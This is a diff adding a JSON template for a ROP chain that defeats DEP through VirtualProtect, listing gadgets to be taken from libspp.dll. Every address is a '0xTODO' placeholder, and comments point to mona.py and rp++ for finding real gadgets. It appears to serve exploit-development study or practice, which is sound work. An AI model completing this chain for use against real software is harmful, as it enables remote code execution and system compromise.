@@ -1,0 +1,87 @@
+{
+  "_comment": [
+    "VirtualProtect DEP bypass gadget template.",
+    "Replace every address with real values found in your target binary.",
+    "Use a tool such as mona.py (!mona rop -m libspp.dll) or rp++ to find gadgets.",
+    "All addresses must be 32-bit hex strings.  No address should be guessed —",
+    "every value here must be verified in the actual target process."
+  ],
+
+  "pop_edi_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "pop edi; ret"
+  },
+
+  "ptr_to_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "ret  (skeleton trampoline — any single ret instruction)"
+  },
+
+  "pop_esi_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "pop esi; ret"
+  },
+
+  "virtualprotect_ptr": {
+    "address": "0xTODO",
+    "module": "kernel32.dll (IAT in libspp.dll)",
+    "instruction": "IAT entry — dword that holds the address of VirtualProtect"
+  },
+
+  "pop_ebp_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "pop ebp; ret"
+  },
+
+  "jmp_esp": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "jmp esp"
+  },
+
+  "pop_eax_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "pop eax; ret"
+  },
+
+  "neg_eax_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "neg eax; ret"
+  },
+
+  "xchg_eax_ebx_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "xchg eax, ebx; ret"
+  },
+
+  "pop_edx_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "pop edx; ret"
+  },
+
+  "pop_ecx_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "pop ecx; ret"
+  },
+
+  "pushad_ret": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "pushad; ret"
+  },
+
+  "writable_ptr": {
+    "address": "0xTODO",
+    "module": "libspp.dll",
+    "instruction": "static writable dword — must remain writable at runtime"
+  }
+}
